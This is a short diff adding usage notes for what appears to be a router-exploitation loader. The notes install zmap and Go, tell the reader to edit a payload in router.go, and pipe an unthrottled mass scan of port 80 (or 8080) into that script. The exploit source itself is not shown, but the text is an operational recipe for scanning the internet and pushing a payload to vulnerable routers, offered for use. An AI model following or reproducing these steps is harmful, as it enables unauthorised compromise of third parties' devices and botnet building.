@@ -1,0 +1,10 @@
+ubuntu 24 if possible
+
+apt install zmap -y
+snap install go --classic
+
+change the payload in router.go
+
+zmap -p 80 -r 0 -B 20G -w router.lst | go run router.go 80
+
+change port to 8080 if u want
